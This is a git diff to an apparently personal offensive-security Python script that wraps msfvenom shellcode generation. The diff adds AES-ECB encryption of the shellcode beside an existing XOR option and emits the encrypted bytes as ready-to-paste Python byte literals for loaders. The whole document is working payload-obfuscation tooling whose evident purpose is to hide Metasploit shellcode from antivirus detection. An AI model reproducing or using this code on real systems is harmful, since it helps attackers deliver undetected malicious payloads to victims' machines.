@@ -1,7 +1,23 @@
 # (m4ud)
 import subprocess
 import argparse
+from Crypto.Cipher import AES
+from Crypto.Util import Padding
 
+def aes_encrypt(shellcode, key):
+    """Encrypts the data using the AES encryption method"""
+    key = key.encode()
+    # Pad the key to the correct length
+    key = key.ljust(16, b'\x00')
+    #just to be sure it will be extra padded :), maybe I should implement pad removal if key is too long???
+    while len(key) < 16:
+        key += b'\x00'
+    cipher = AES.new(key, AES.MODE_ECB)
+    shellcode = Padding.pad(shellcode, AES.block_size)
+    encrypted_shellcode = bytearray(cipher.encrypt(shellcode))
+    print("AES enc for py shellcode")
+    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
+    return encrypted_shellcode
 
 def xor_encrypt(shellcode, key):
     """Encrypts the shellcode w XOR encryption method"""
@@ -32,6 +48,26 @@ def main():
     shellcode = msfvenom_output.stdout.decode().strip(" ")
 
     lines = [shellcode[i:i+60] for i in range(0, len(shellcode), 60)]
+    
+    if args.encryption == 'aes' and args.key:
+        shellcode += "\""
+        shellcode = shellcode.replace("\" +\n\"", "")
+        shellcode = shellcode.replace("shellcode =  b\"", "")
+        shellcode = shellcode.replace("\"\n\"","")
+        shellcode = shellcode.replace("\"\nshellcode += b\"", "")
+        shellcode = shellcode.replace("\\x","")
+        shellcode = bytearray.fromhex(shellcode)
+        encrypted_shellcode = aes_encrypt(shellcode, args.key)
+        #print(shellcode)
+        print("EncShellcode = b", end="")
+        print("\"", end="")
+        for i, b in enumerate(encrypted_shellcode):
+            print("\\x%02x" % b, end="")
+            if (i+1) % 15 == 0:
+                print("\"")
+                print("EncShellcode += b\"", end="")
+        print("\"")
+    
     if args.encryption == 'xor':
         shellcode += "\""
         shellcode = shellcode.replace("\" +\n\"", "")
@@ -50,10 +86,14 @@ def main():
                 print("\"")
                 print("EncShellcode += b\"", end="")
         print("\"")
-    else:
-        shellcode = shellcode.replace('shelcode =','OShellcode = ')
-        shellcode = shellcode.replace('shelcode +=','OShellcode += ')
-        print(shellcode)
+        
+    if args.encryption == None:
+        if isinstance(shellcode, bytes):
+            shellcode = shellcode.replace(b'shelcode =',b'OShellcode = ')
+        else:
+            shellcode = shellcode.replace('shelcode =','OShellcode = ')
+            print(shellcode)
 
+            
 if __name__ == '__main__':
     main()
